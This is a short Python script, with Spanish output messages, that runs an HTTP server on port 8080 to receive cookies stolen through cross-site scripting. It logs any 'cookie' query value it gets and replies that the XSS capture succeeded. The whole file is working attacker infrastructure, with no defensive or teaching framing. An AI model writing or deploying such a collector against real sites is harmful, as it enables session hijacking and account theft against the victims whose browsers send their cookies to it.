from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib

class XSSCaptureHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query_components = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        cookie_data = query_components.get('cookie', [''])[0]
        if cookie_data:
            print(f"Cookie capturada: {cookie_data}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'XSS Captura exitosa!')

server = HTTPServer(('0.0.0.0', 8080), XSSCaptureHandler)
server.serve_forever()

